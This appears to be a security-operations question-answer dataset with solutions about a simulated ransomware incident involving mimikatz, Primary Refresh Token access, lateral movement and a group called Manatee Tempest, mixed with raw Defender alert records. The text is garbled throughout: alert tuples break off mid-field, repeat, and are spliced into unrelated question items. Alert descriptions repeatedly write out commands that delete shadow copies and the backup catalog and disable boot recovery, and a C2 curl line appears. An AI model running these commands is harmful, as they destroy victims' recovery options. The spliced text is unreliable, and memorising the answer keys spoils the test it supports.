question.context: A command and control behavior was blocked on host `vnevado-win10r`, which indicated an active infection by malware that could replicate and receive commands from remote attackers. This malware was active, and precautionary measures should be taken to check for residual signs of infection. The process involved had the ID 1332 and ran the command `curl http://vectorsandarrows.com`.
question.question: What is the IP address associated with the Manatee Tempest activity group detected in this security incident?
solution: The account with SID `S-1-5-21-1840191660-8534830288-125585561-1522` was involved in a Command and Control behavior that was blocked.
The cybercriminal group known as Manatee Tempest, which is associated with the IP address `198.43.121.209`, was active during the incident.

It was notorious for one of its earliest malware lexpaigns – the Dridex banking trojan. Manatee Tempest is also one of the first groups to be sanctioned by the Office of Foreign Assets Control (OFAC) in 2019.

Manatee Tempest’s tactics rely on a partnership with Mustard Tempest, an access broker that facilitates access to target networks. Manatee Tempest has been observed targeting organizations across a diverse array of industries with methods such as drive-by download, including malvertising and FakeUpdates (also known as SocGholish) infections facilitated by Mustard Tempest to obtain initial access, followed by BLISTER loader to deliver Cobalt Strike beacons which are used for lateral movement and ransomware deployment. The actor also uses domain fronting to establish command-and-control channel for Cobalt Strike beacons. Manatee Tempest overlaps with activity tracked by the cyber intelligence industry as EvilCorp, UNC2165, and Indrik Spider.

tampering', 'System recovery setting tampering', 'High', 'System recovery setting tampering has been observed on this device. Adversaries might be attempting to delete or remove built-in operating system data and turn off recovery services to prevent recovering a corrupted system. This may deny access to available backups and recovery options.

Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may stop or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact.

Many native Windows utilities have been used by adversaries to disable or delete system recovery features:
•	 vssblatemp.exe can be used to delete all volume shadow copies on a system using the following command: [vssblatemp.exe delete shadows /all /quiet]
•	Windows Management Instrumentation can be used to delete volume shadow copies using the following command: [wmic shadowcopy delete]
•	wbblatemp.exe can be used to delete the Windows Backup Catalog using the following command: [wbblatemp.exe delete catalog -quiet]
•	bcdedit.exe can be used to disable automatic Windows recovery features by modifying boot configuration data using the following command: [bcdedit.exe /set default bootstatuspolicy ignoreallfailures & bcdedit /set default recoveryenabled no]', 'MDATP', 'Microsoft', '3e6bd315-8c89-4a24-8579-9601035ef416_1', '62857e21-c95b-4124-457c-3bdcef05583f', '', '', 'WindowsDefenderAtp', '', '', 'False', '2024-06-20 09:32:00.329557+00:00', '2024-06-20 09:32:03.749465+00:00', '2024-06-20 09:39:59.776942+00:00', '["1. Validate the alert.
1. Check if the device owner or IT personnel had a legitimate reason to launch the command.
2. Look for recent signs of activity by the compromised user account or device and investigate them. Make sure to check other devices in your organization, as well as the original device associated with the compromised assets.
3. Review device timelines for suspicious activity that may have occurred around the time of the alert.
4. Look for unfamiliar processes. Check files for prevalence, their locations, and digital signatures.
5. Submit relevant files for deep analysis and review file behaviors.
6. Look for the presence of relevant artifacts on other devices. Identify commonalities and differences between potentially compromised devices.

B. Scope the incident. Find related devices, network addresses, and files in the incident graph.

C. Contain and mitigate the breach.
1. Stop suspicious processes, isolate affected systems, decommission compromised accounts or reset passwords, block IP addresses and URLs, and install security updates.
2. If you believe that the alert is a false positive:
     2.1 A user may have been suspended automatically. Revert the action by enabling the user account through the MDI portal or Active Directory.

A Primary Refresh Token (PRT) is a key artifact of Azure AD authentication on Windows 10, Windows Server 2016 and later versions, iOS, and Android devices. It is a JSON Web Token (JWT) that's specially issued to Microsoft first party token brokers to enable single sign-on (SSO) across the applications used on those devices. Attackers can attempt to access this resource to move laterally into organization or perform credential theft.

For more information, read the Activity profile: Midnight Blizzard credential attacks Threat Analytics report: https://security.microsoft.com/threatanalytics3/e4aad043-a273-4f88-b65e-fdfc3996ec92/analystreport?

question.context: A Mimikatz credential theft tool was detected on a device at 2024-07-04 22:35:03.797541+00:00. Mimikatz is a tool used to harvest plaintext passwords, password hashes, smartcard PINs, and Kerberos tickets. The attacker might be leveraging this tool to harvest credentials to log into this or other devices on the network by impersonating a valid user. Several command line executions involving `mimikatz.exe` were observed, along with connected mimikatz-related files like `mimidrv.sys`, `mimispool.dll`, and `mimilove.exe`. More information can be found in the Mimikatz tool profile Threat Analytics report and the Actor profile: Storm-0875 Threat Analytics report provided by Microsoft.

('System recovery setting tampering', 'System recovery setting tampering has been observed on this device. This may deny access to available backups and recovery options.

Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may stop or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact.

•	wbblatemp.exe can be used to delete the Windows Backup Catalog using the following command: [wbblatemp.exe delete catalog -quiet]

('System recovery setting tampering', 'System recovery setting tampering has been observed on this device. This may deny access to available backups and recovery options.

Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may stop or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact.

•	wbblatemp.exe can be used to delete the Windows Backup Catalog using the following command: [wbblatemp.exe delete catalog -quiet]

Manatee Tempest is also one of the first groups to be sanctioned by the Office of Foreign Assets Control (OFAC) in 2019.

Manatee Tempest’s tactics rely on a partnership with Mustard Tempest, an access broker that facilitates access to target networks. Manatee Tempest has been observed targeting organizations across a diverse array of industries with methods such as drive-by download, including malvertising and FakeUpdates (also known as SocGholish) infections facilitated by Mustard Tempest to obtain initial access, followed by BLISTER loader to deliver Cobalt Strike beacons which are used for lateral movement and ransomware deployment. The actor also uses domain fronting to establish command-and-control channel for Cobalt Strike beacons. Manatee Tempest overlaps with activity tracked by the cyber intelligence industry as EvilCorp, UNC2165, and Indrik Spider.

[('e34d562e-ef12-4c4e-9bc0-7c6ae357c015', '2024-06-20 09:19:23.499691+00:00', 'System recovery setting tampering', 'System recovery setting tampering', 'High', 'System recovery setting tampering has been observed on this device. Adversaries might be attempting to delete or remove built-in operating system data and turn off recovery services to prevent recovering a corrupted system. This may deny access to available backups and recovery options.

Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may stop or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact.

Many native Windows utilities have been used by adversaries to disable or delete system recovery features:
•	 vssblatemp.exe can be used to delete all volume shadow copies on a system using the following command: [vssblatemp.exe delete shadows /all /quiet]
•	Windows Management Instrumentation can be used to delete volume shadow copies using the following command: [wmic shadowcopy delete]
•	wbblatemp.exe can be used to delete the Windows Backup Catalog using the following command: [wbblatemp.exe delete catalog -quiet]
•	bcdedit.exe can be used to disable automatic Windows recovery features by modifying boot configuration data using the following command: [bcdedit.exe /set default bootstatuspolicy ignoreallfailures & bcdedit /set default recoveryenabled no]', 'MDATP', 'Microsoft', '5984c937-d71d-4fb9-9eb9-e0eddb531b1c_1', '65e0e94f-36d8-f3a7-039e-c1770857c3ce', '', '', 'WindowsDefenderAtp', '', '', 'False', '2024-06-20 09:10:48.076628+00:00', '2024-06-20 09:10:50.905677+00:00', '2024-06-20 09:19:23.178094+00:00', '["1. •	Check if files on the affected device were encrypted by ransomware. If files were encrypted, isolate the affected devices.
•	Check the device timeline for other suspicious activities.
•	Check other devices on the network for the observed deleted file name, or SHA1.
•	Find the infection source and block it (IP or email).
•	Rebuild the affected device. 
•	Ensure your software has the latest patch, update your malware signatures, and close the vectors of attack.
•	Move out-of-date applications to other systems to reduce the attack surface.
•	Deploy the Enhanced Mitigation Experience Toolkit (EMET) utility for behavioral-based exploit prevention.
•	Configure your Trust Center to disable tampering', 'System recovery setting tampering', 'High', 'System recovery setting tampering has been observed on this device. Adversaries might be attempting to delete or remove built-in operating system data and turn off recovery services to prevent recovering a corrupted system. This may deny access to available backups and recovery options.

Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may stop or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact.

Many native Windows utilities have been used by adversaries to disable or delete system recovery features:
•	 vssblatemp.exe can be used to delete all volume shadow copies on a system using the following command: [vssblatemp.exe delete shadows /all /quiet]
•	Windows Management Instrumentation can be used to delete volume shadow copies using the following command: [wmic shadowcopy delete]
•	wbblatemp.exe can be used to delete the Windows Backup Catalog using the following command: [wbblatemp.exe delete catalog -quiet]
•	bcdedit.exe can be used to disable automatic Windows recovery features by modifying boot configuration data using the following command: [bcdedit.exe /set default bootstatuspolicy ignoreallfailures & bcdedit /set default recoveryenabled no]', 'MDATP', 'Microsoft', '3fcede41-9fdb-4dfb-9fd0-69f1c6fa88bf_1', '8edf196f-fae8-6f94-3acd-93c648e9aa1f', '', '', 'WindowsDefenderAtp', '', '', 'False', '2024-06-20 09:29:38.767268+00:00', '2024-06-20 09:29:41.284899+00:00', '2024-06-20 09:39:59.777330+00:00', '["1. tampering', 'System recovery setting tampering', 'High', 'System recovery setting tampering has been observed on this device. Adversaries might be attempting to delete or remove built-in operating system data and turn off recovery services to prevent recovering a corrupted system. This may deny access to available backups and recovery options.

Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may stop or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact.

Many native Windows utilities have been used by adversaries to disable or delete system recovery features:
•	 vssblatemp.exe can be used to delete all volume shadow copies on a system using the following command: [vssblatemp.exe delete shadows /all /quiet]
•	Windows Management Instrumentation can be used to delete volume shadow copies using the following command: [wmic shadowcopy delete]
•	wbblatemp.exe can be used to delete the Windows Backup Catalog using the following command: [wbblatemp.exe delete catalog -quiet]
•	bcdedit.exe can be used to disable automatic Windows recovery features by modifying boot configuration data using the following command: [bcdedit.exe /set default bootstatuspolicy ignoreallfailures & bcdedit /set default recoveryenabled no]', 'MDATP', 'Microsoft', '3e6bd315-8c89-4a24-8579-9601035ef416_1', '62857e21-c95b-4124-457c-3bdcef05583f', '', '', 'WindowsDefenderAtp', '', '', 'False', '2024-06-20 09:32:00.329557+00:00', '2024-06-20 09:32:03.749465+00:00', '2024-06-20 09:44:53.379230+00:00', '["1. Adversaries might be attempting to delete or remove built-in operating system data and turn off recovery services to prevent recovering a corrupted system. This may deny access to available backups and recovery options.

Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may stop or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact.

Many native Windows utilities have been used by adversaries to disable or delete system recovery features:
•	 vssblatemp.exe can be used to delete all volume shadow copies on a system using the following command: [vssblatemp.exe delete shadows /all /quiet]
•	Windows Management Instrumentation can be used to delete volume shadow copies using the following command: [wmic shadowcopy delete]
•	wbblatemp.exe can be used to delete the Windows Backup Catalog using the following command: [wbblatemp.exe delete catalog -quiet]

question.context: A possible attempt to access Primary Refresh Token (PRT) was detected on the host `vnevado-win10s` involving user with username `dp5hn`. The PRT is a key artifact of Azure AD authentication used to enable single sign-on (SSO) across applications on supported devices, and attackers attempting to access this resource could be aiming for lateral movement or credential theft. The attempt was carried out by the process `browsercore.exe` as observed from the process ID `2676`.
question.question: Related to this alert, there was an active malware detected subsequently. Can you identify the name of the malware file detected on the machine?
solution: There was a possible attempt to access Primary Refresh Token (PRT) through the process `browsercore.exe` detected on 2024-07-04.
Another possible attempt to access Primary Refresh Token (PRT) was detected involving the account with SID `S-5-7-21-1843151660-3234030288-105586167-1422`.
Active unknown malware, specifically `mimikatz.exe`, was detected and running on the machine.

question.context: On 2024-07-04, a ransomware payload was remotely launched on a device, which might have aimed to encrypt content and render it unusable. This malicious activity originated from the IP address `99.83.111.100`. Thereafter, 'CommandAndControl' malware was identified on the device, suggesting an attempted lateral movement by the attacker.
question.question: What is the command line of the process that was executed when the 'CommandAndControl' malware was detected during lateral movement?
solution: The ransomware payload was remotely launched on the account `dp5hn` at `2024-07-04 22:35:01.951341+00:00`.

The 'CommandAndControl' malware was detected during lateral movement. The attacker's command line was `curl http://vectorsandarrows.com` and it was executed with Process ID `5572` on `2024-06-20t09:32:04.8002759z`.

question.context: There was a detection of unknown malware being active in the environment, which was stopped by Windows Defender but it is recommended to further check the machine for signs of infection. Following that, there were multiple alerts indicating possible attempts to access Primary Refresh Token (PRT) which is a key artifact used for Azure AD authentication. Additionally, we observed an alert where system recovery settings were tampered with, indicating that adversaries might be attempting to delete or disable built-in operating system data and recovery services. This could prevent recovery of a corrupted system and denie access to backups and recovery options. Various built-in Windows utilities can be exploited to disable or delete system recovery features, posing a risk to system integrity.
question.question: What is the name of the account involved in the system recovery setting tampering incident?
solution: An unknown malware was detected and was active on the host with AadDeviceId `4d8d23e9-a77d-4e33-9435-b8c457e57ca1`.
There was a possible attempt to access the Primary Refresh Token (PRT) involving the process `browsercore.exe`.
The user with SID `S-1-5-21-1840191660-8534830288-125585561-1522` was involved in a potential attempt to access the Primary Refresh Token (PRT).
System recovery setting tampering was observed on the account named `dp5hn`.

question.context: A recent security incident indicated a possible attempt to access the Primary Refresh Token (PRT) on host `vnevado-win10v` using the file `powershell.exe`. The possible incident occurred on July 4th, 2024, and was detected as a Primary Refresh Token (PRT) is critical for Azure AD authentication. This anomaly suggests an attacker might be trying to move laterally or perform credential theft. Another related observation was a suspicious network event indicating possible lateral movement to another device.
question.question: As part of this investigation, could you identify the IP address of the device that the attacker possibly moved to laterally?
solution: There is a possible attempt to access the Primary Refresh Token (PRT) using the process `browsercore.exe`.
The attempt to access the PRT originated from the host `vnevado-win11u`.
There is a possibility of lateral movement originating from the IP address `38.142.109.10` in close time proximity to the suspicious PRT access attempt.

question.context: A security incident involving multiple alerts reported by various entities. One of the alerts indicates the detection of active unknown malware that poses a significant threat as it can perform harmful actions and has persistence mechanisms in place.
question.question: What was the URL associated with the command and control behavior that was blocked?
solution: Active unknown malware was detected on the host with AadDeviceId `4d8d23e9-a77d-4e33-9435-b8c457e57ca1`.
Lateral movement to the jump server was conducted using PSExec to IP address `99.83.111.100`.
Potentially compromised assets with SID `S-1-5-21-1840191660-8534830288-125585561-1522` exhibited ransomware-like behavior, impacting several devices.
A malicious command and control behavior directed to the URL `http://vectorsandarrows.com/` was blocked.

question.context: The Manatee Tempest activity tracked by Microsoft is a notorious Russia-based cybercriminal group that has been active since June 2014, and involved in various malicious activities such as drive-by downloads and ransomware deployment. A recent incident associated with this group involved a suspicious HTTP request to `vectorsandarrows.com` from the IP address `198.43.121.209` using the command line: `curl http://vectorsandarrows.com`, with process ID 6460. Additionally, system recovery setting tampering with the command `bcdedit /set recoveryenabled no` was observed, likely to hinder recovery options in case of system corruption.
question.question: What is the process ID and the exact time when the `bcdedit /set recoveryenabled no` command was executed as part of the system recovery setting tampering?
solution: The account `dp5hn` is associated with activity from the Manatee Tempest cybercriminal group known for using tactics such as drive-by downloads, malvertising, and FakeUpdates to gain initial access.

A system recovery setting tampering attempt was detected with the command `bcdedit /set recoveryenabled no` executed by process ID `8136` on `2024-06-20t09:10:48.0438707z`, which might indicate an attempt to disable system recovery features on the device.

question.context: A significant security incident involved potentially compromised assets exhibiting ransomware-like behavior. This impacted several devices where an attacker might be operating using a specific user account, IP, or device to move laterally across the network and infect as many devices as possible with ransomware. The automated remediation action might be taken to disable the account or device used by the attacker. One of the detected entities was IP address `99.83.111.100`, associated with the script `get-userprttoken.ps1` on the host `vnevado-win11t`.
question.question: Can you identify the URL associated with the blocked command and control behavior related to the malware infection?
solution: There are potentially compromised assets exhibiting ransomware-like behavior associated with the user account having SID `S-1-5-21-1840191660-8534830288-125585561-1522`.
Command and Control (C2) behavior was blocked, linked to the URL `http://vectorsandarrows.com/`.

question.context: A possible attempt to access the Primary Refresh Token (PRT) was detected on the host `vnevado-win11u` with AadDeviceId `bc00e484-d0e5-4da4-9472-95568cccc07e`. The process involved in this attempt was `browsercore.exe` (ProcessId: 1640), launched at `2024-06-20T09:32:12.1031042Z`. PRT is a key artifact of Azure AD authentication used for single sign-on across applications, and attackers may target it to move laterally or perform credential theft. For more information, read the Activity profile: Midnight Blizzard credential attacks Threat Analytics report on the Microsoft Security website.
question.question: Can you provide the command line of the process that was created using WMI on the host?
solution: There was a possible attempt to access the Primary Refresh Token (PRT) associated with the Azure AD user with AadUserId `731adb71-b11c-4bbf-850b-57989b350e96`.
There was a suspicious WMI process creation observed with the process command line `vssblatemp.exe delete shadows /all` at `2024-06-20t09:29:40.8785892z` with Process ID `1900`.

A Primary Refresh Token (PRT) is a key artifact of Azure AD authentication on Windows 10, Windows Server 2016 and later versions, iOS, and Android devices. It is a JSON Web Token (JWT) that's specially issued to Microsoft first party token brokers to enable single sign-on (SSO) across the applications used on those devices. Attackers can attempt to access this resource to move laterally into organization or perform credential theft.

question.context: A security incident involving system recovery setting tampering was observed on the device with name `vnevado-win10r`. The incident involved processes `vssblatemp.exe` and `bcdedit.exe` being executed on the host `vnevado-win10r` to potentially disrupt recovery options. Additionally, suspicious hands-on keyboard user behavior was detected around the same time, which might indicate that the user has been compromised.
question.question: Following these activities, there was an indication of ransomware behavior detected in the file system on a device. Can you determine the AadDeviceId of the host where this ransomware activity was detected?
solution: The account `dp5hn` was responsible for tampering with system recovery settings.
The same host device with AadDeviceId `e5799261-6720-4297-961e-bd9ca4275033` exhibited suspicious hands-on keyboard behavior, indicating a potential user compromise.
Ransomware behavior was detected on the host with AadDeviceId `e5799261-6720-4297-961e-bd9ca4275033`, indicating potential mass encryption of files by ransomware.

question.context: An alert reported that the LSASS process memory was modified, potentially to bypass security measures. During this incident, a suspicious process `notepad.exe` was observed running on host `vnevado-win10v` with specific command line arguments. Another alert was subsequently triggered indicating that a Windows Sysinternals tool was renamed and executed.
question.question: From the subsequent alert, what was the name of the Windows Sysinternals tool that was renamed before it was launched?
solution: The LSASS process memory was modified from IP address `107.224.99.179`.
A Windows Sysinternals tool was renamed to `mimikatz.exe` and then launched, which might indicate malicious activity.

question.context: A security incident involving multiple malicious activities was detected. It started with a known credential theft tool, `mimikatz.exe`, being executed at two different times, indicating an attempt to dump users' credentials. This activity led to lateral movement attempts to the jump server and suspicious remote activities on the machine. Subsequent analysis revealed command and control behavior of malware which was blocked.
question.question: What was the URL associated with the command and control behavior detected in the end alert?
solution: A known credential theft tool execution was detected on the host with AadDeviceId `4d8d23e9-a77d-4e33-9435-b8c457e57ca1`.
There was lateral movement to the jump server from the IP address `99.83.111.100` using PSExec.
Suspicious remote activity was observed on the account `dp5hn`.
Command and Control behavior was blocked for the URL `http://vectorsandarrows.com/`.

question.context: During a recent security investigation, it was found that a malicious credential theft tool `mimikatz.exe` was executed with the process ID 4464 on 2024-06-20 at 09:03:04.6442161, originating from IP address `107.224.99.179`. The command line included attempts to leverage credentials from the domain `vnevado.alpineskihouse.co`. This execution was flagged on 2024-07-04 at 22:35:03.869406+00:00 for its intent to dump user credentials. Subsequently, there was a lateral movement attempt to the jump server `Vnevado-jump` on 2024-07-10 at 11:24:45.260113+00:00.
question.question: During this investigation, a potentially compromised user account was identified. Can you provide the SID of the user account that may be operating with ransomware-like behavior?
solution: A known credential theft tool execution command was detected on the account with the name `tgs2z`.
Lateral movement to the jump server `Vnevado-jump` was performed from the IP address `99.83.111.100`.
The account with SID `S-1-5-21-1840191660-8534830288-125585561-1522` was exhibiting ransomware-like behavior, impacting several devices.

question.context: A security incident involving an attempt to access a Primary Refresh Token (PRT) was detected. The PRT is a key artifact of Azure AD authentication on various devices, including Windows 10. The incident involved a device with HostName `vnevado-win10s` and AadDeviceId `f5b847aa-8712-4bf6-b4f7-ed6cd89e1505`, where the process `browsercore.exe` (ProcessId `2676` created at `2024-06-20T09:10:59.867384Z`) was running. Attackers may use this to move laterally within the organization.
question.question: Following this incident, 'CommandAndControl' malware was detected on another device during lateral movement. What is the AadDeviceId of this affected device?
solution: A possible attempt to access Primary Refresh Token (PRT) has been detected for the user with AadUserId `731adb71-b11c-4bbf-850b-57989b350e96`.
'CommandAndControl' malware was detected on the device with AadDeviceId `bc00e484-d0e5-4da4-9472-95568cccc07e`, indicating an attempt of lateral movement.

question.context: A security incident was detected involving suspicious 'GenRansom' behavior on the host 'vnevado-win11t'. This malware can perform harmful actions and spread across machines. The active malware was found running or having persistence mechanisms in place, necessitating urgent precautionary measures. Following this, a system recovery setting tampering alert was observed on the device, where adversaries might be disabling recovery features using native Windows utilities.

[('Manatee Tempest activity group', 'Manatee Tempest activity group', 'The actor that Microsoft tracks as Manatee Tempest is a Russia-based cybercriminal group that has been active since June 2014. It was notorious for one of its earliest malware lexpaigns – the Dridex banking trojan. Manatee Tempest is also one of the first groups to be sanctioned by the Office of Foreign Assets Control (OFAC) in 2019.

Manatee Tempest’s tactics rely on a partnership with Mustard Tempest, an access broker that facilitates access to target networks. Manatee Tempest has been observed targeting organizations across a diverse array of industries with methods such as drive-by download, including malvertising and FakeUpdates (also known as SocGholish) infections facilitated by Mustard Tempest to obtain initial access, followed by BLISTER loader to deliver Cobalt Strike beacons which are used for lateral movement and ransomware deployment. The actor also uses domain fronting to establish command-and-control channel for Cobalt Strike beacons. Manatee Tempest overlaps with activity tracked by the cyber intelligence industry as EvilCorp, UNC2165, and Indrik Spider.

For more information, read the Actor Profile: Manatee Tempest Threat Analytics report: https://security.microsoft.com/threatanalytics3/a22c3410-db8f-4c58-866e-ebb760e509d0/analystreport', 'vnevado-win11t.vnevado.alpineskihouse.co'), ('System recovery setting tampering', 'System recovery setting tampering', 'System recovery setting tampering has been observed on this device. Adversaries might be attempting to delete or remove built-in operating system data and turn off recovery services to prevent recovering a corrupted system. This may deny access to available backups and recovery options.

Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may stop or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact.

Many native Windows utilities have been used by adversaries to disable or delete system recovery features:
•	 vssblatemp.exe can be used to delete all volume shadow copies on a system using the following command: [vssblatemp.exe delete shadows /all /quiet]
•	Windows Management Instrumentation can be used to delete volume shadow copies using the following command: [wmic shadowcopy delete]
•	wbblatemp.exe can be used to delete the Windows Backup Catalog using the following command: [wbblatemp.exe delete catalog -quiet]
•	bcdedit.exe can be used to disable automatic Windows recovery features by modifying boot configuration data using the following command: [bcdedit.exe /set default bootstatuspolicy ignoreallfailures & bcdedit /set default recoveryenabled no]', 'vnevado-win11t.vnevado.alpineskihouse.co'), ('Possible attempt to access Primary Refresh Token (PRT)', 'Possible attempt to access Primary Refresh Token (PRT)', "Possible attempt to access Primary Refresh Token (PRT) has been detected. A Primary Refresh Token (PRT) is a key artifact of Azure AD authentication on Windows 10, Windows Server 2016 and later versions, iOS, and Android devices. It is a JSON Web Token (JWT) that's specially issued to Microsoft first party token brokers to enable single sign-on (SSO) across the applications used on those devices. Attackers can attempt to access this resource to move laterally into organization or perform credential theft.

For more information, read the Activity profile: Midnight Blizzard credential attacks Threat Analytics report: https://security.microsoft.com/threatanalytics3/e4aad043-a273-4f88-b65e-fdfc3996ec92/analystreport?

", 'vnevado-win11t.vnevado.alpineskihouse.co'), ('Ransomware behavior detected in the file system', 'Ransomware behavior detected in the file system', 'Suspicious file system changes might indicate ransomware activity. This potential ransomware activity might be indicative of mass encryption of files by ransomware.

For more information, read the Ransomware: A pervasive and ongoing threat Threat Analytics report: https://security.microsoft.com/threatanalytics3/05658b6c-dc62-496d-ad3c-c6a795a33c27/analystreport

Also read the Activity Profile: Iranian MOIS operators opportunistically deploy limited-impact wiper in response to Israel-Hamas war Threat Analytics report: https://security.microsoft.com/threatanalytics3/c6674205-df28-453a-9e42-0010b7979bdd/overview?tid4b2462a4-bbee-495a-a0e1-f23ae524cc9c', 'vnevado-win11t.vnevado.alpineskihouse.co'), ('Suspicious remote activity', 'Suspicious remote activity', 'Suspicious activity initiated remotely was observed on this machine. question.context: A security incident regarding System recovery setting tampering and possible attempts to access Primary Refresh Token (PRT) was reported. Specifically, there was an attempt to disable system recovery features using `vssblatemp.exe` and `bcdedit` on the host `vnevado-win11u` with a user account having the SID `S-1-5-21-1840191660-8534830288-125585561-1522`. Notably, it included a potential access of PRTs, as mentioned in the Midnight Blizzard credential attacks Threat Analytics report.
question.question: In relation to the malicious credential theft tool execution detected in this multi-stage incident, can you identify the file name of the tool that was executed?
solution: The system recovery settings tampering was attempted by the user with AadUserId `731adb71-b11c-4bbf-850b-57989b350e96`.
An attempt to access Primary Refresh Token (PRT) was detected, associated with the process `browsercore.exe`.
Another attempt to access Primary Refresh Token (PRT) was detected, originating from the IP address `107.224.99.179`.
A malicious credential theft tool `mimikatz.exe` was executed.

question.context: A security incident involving the Manatee Tempest activity group was reported. This Russia-based cybercriminal group, which has been active since June 2014, is known for malware campaigns including the Dridex banking trojan. They often gain initial access through methods such as drive-by downloads and malvertising, facilitated by their partnership with Mustard Tempest. As part of this security incident, a suspicious WMI process creation was observed on the machine `vnevado-win10r`, which might be an indicator of malware using WMI to spawn new processes and further infect the machine.

('2024-06-20 09:40:00.407711+00:00', 'System recovery setting tampering', 'System recovery setting tampering has been observed on this device. Adversaries might be attempting to delete or remove built-in operating system data and turn off recovery services to prevent recovering a corrupted system. This may deny access to available backups and recovery options.

Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may stop or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact.

Many native Windows utilities have been used by adversaries to disable or delete system recovery features:
•	 vssblatemp.exe can be used to delete all volume shadow copies on a system using the following command: [vssblatemp.exe delete shadows /all /quiet]
•	Windows Management Instrumentation can be used to delete volume shadow copies using the following command: [wmic shadowcopy delete]
•	wbblatemp.exe can be used to delete the Windows Backup Catalog using the following command: [wbblatemp.exe delete catalog -quiet]
•	bcdedit.exe can be used to disable automatic Windows recovery features by modifying boot configuration data using the following command: [bcdedit.exe /set default bootstatuspolicy ignoreallfailures question.context: On 2024-07-04 at 22:35:03.423858, a possible ransomware activity based on a known malicious extension was detected. Numerous file system changes were observed on the device `vnevado-win11u`. These changes involved appending file extensions such as `ponceau.7z.lockbit`, `kiters.7z.lockbit`, and `unstreaming.xlsx.lockbit`. This activity might indicate mass encryption of files by ransomware.
question.question: What is the AadDeviceId of the host where 'CommandAndControl' malware was detected during lateral movement at 2024-07-04 22:35:03.912589?
solution: There is possible ransomware activity detected on an account with AadUserId `731adb71-b11c-4bbf-850b-57989b350e96`, involving file system changes indicative of mass encryption of files.

'CommandAndControl' malware was detected on the device with AadDeviceId `9d4887ba-0b69-47d6-89bc-9b32787f379e`, suggesting that an attacker might be attempting lateral movement to this device from another device on the network.

question.context: A recent security incident involved potentially compromised assets exhibiting ransomware-like behavior impacting multiple devices. The attacker might have been using various user accounts, IP addresses, or devices to spread ransomware across the network, and automated remediation actions may have been activated to address the affected entities. One of the devices involved in this incident is identified with the hostname `vnevado-win11u`.
question.question: During this incident, there was also a detected attempt to access the Primary Refresh Token (PRT). What is the AadDeviceId of the host involved in this attempt?
solution: The user account with SID `S-1-5-21-1840191660-8534830288-125585561-1522` is potentially compromised and exhibiting ransomware-like behavior, affecting multiple devices.
There was a possible attempt to access a Primary Refresh Token (PRT) from the device with AadDeviceId `9d4887ba-0b69-47d6-89bc-9b32787f379e`.

question.context: On 2024-07-04, there was a security incident involving suspicious WMI process creation on a machine. Malware often uses WMI to spawn new processes, breaking process trees and further infecting a machine. During this incident, various commands and scripts were executed, including `vssblatemp.exe delete shadows /all`, `bcdedit /set bootstatuspolicy ignoreallfailures`, and a PowerShell script `get-userprttoken.ps1`. This activity might be connected to a ransomware attack.
question.question: What is the IP address from which the ransomware payload was remotely launched?
solution: A suspicious WMI process creation was observed on the machine by the user with SID `S-1-5-21-1840191660-8534830288-125585561-1522`.
A ransomware payload was remotely launched from IP address `99.83.111.100`.

question.context: A security incident involving suspected tampering with system recovery settings using various commands and processes, including `vssblatemp.exe` to delete all volume shadow copies, was observed on device `vnevado-win11t` (AAD Device ID: `e5799261-6720-4297-961e-bd9ca4275033`). During the incident, the process `vssblatemp.exe` was executed with command: `vssblatemp.exe delete shadows /all`. This is part of an adversarial attempt to prevent the recovery of corrupted systems by deleting built-in operating system data or turning off recovery services. The incident was detected on 2024-07-04. This tampering could deny access to available backups and recovery options, augmenting the effects of data destruction or data encryption.

question.context: A Mimikatz credential theft tool was detected on a device. Mimikatz is a credential theft tool that can harvest plaintext passwords, password hashes, smartcard PINs, and Kerberos tickets. Attackers may use this tool to harvest credentials to log into this or other devices on the network by impersonating a valid user. The detection of Mimikatz is part of a broader security investigation. Additionally, there was later evidence of lateral movement to the jump server `Vnevado-jump` using PSExec.
question.question: A related alert indicated a possible compromised user account dropping ransomware-related files. Can you identify the name of the specific file associated with the ransomware activity?
solution: The Mimikatz credential theft tool was detected on the device with AadDeviceId `4d8d23e9-a77d-4e33-9435-b8c457e57ca1`.
Lateral movement to the jump server occurred using PSExec to IP address `99.83.111.100`.
A compromised user account was observed dropping a ransomware-related file named `get-userprttoken.ps1` on several devices.

question.context: A recent malware incident was detected and blocked which exhibited Command and Control behavior. The malware ran a `curl` command to fetch content from a URL `http://vectorsandarrows.com/` on the host `vnevado-win10r`. This malware is considered active, thus precautionary measures should be taken to check for any signs of infection.
question.question: As part of this incident, a ransomware payload was also remotely launched. Can you identify the IP address involved in the ransomware activity?
solution: A command and control behavior associated with malware was blocked on the account with SID `S-1-5-21-1840191660-8534830288-125585561-1522`.
A ransomware payload was remotely launched from IP address `99.83.111.100`, potentially attempting to encrypt content on the device.

('Manatee Tempest activity group', 'The actor that Microsoft tracks as Manatee Tempest is a Russia-based cybercriminal group that has been active since June 2014. It was notorious for one of its earliest malware lexpaigns – the Dridex banking trojan. Manatee Tempest is also one of the first groups to be sanctioned by the Office of Foreign Assets Control (OFAC) in 2019.

